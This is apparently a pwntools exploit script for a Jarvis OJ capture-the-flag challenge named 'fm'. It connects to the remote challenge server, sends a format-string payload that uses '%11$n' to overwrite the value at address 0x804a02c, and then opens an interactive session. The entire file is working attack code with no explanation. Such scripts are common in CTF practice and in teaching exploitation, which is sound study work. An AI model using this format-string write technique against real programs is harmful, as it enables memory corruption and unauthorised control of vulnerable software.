#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
io = remote('pwn2.jarvisoj.com', 9895)
# io = process('./fm')
elf = ELF('./fm')
xaddr = 0x804a02c

payload = p32(xaddr) + '%11$n'

io.sendline(payload)
io.interactive()
io.close()
